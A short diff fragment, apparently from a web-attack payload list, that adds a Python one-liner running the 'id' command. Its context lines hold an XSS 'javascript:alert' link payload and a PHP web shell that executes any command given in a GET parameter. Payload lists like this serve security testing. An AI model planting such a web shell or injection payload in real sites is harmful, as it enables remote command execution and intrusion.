@@ -216,6 +216,8 @@ javascript:alert('XSS href')
 <?php system($_GET['hacker']);?>
 
 <?php system('id');?>
+
+python3 -c "import subprocess; print(subprocess.check_output(['id'], text=True).strip())"
 ```
 
 ```
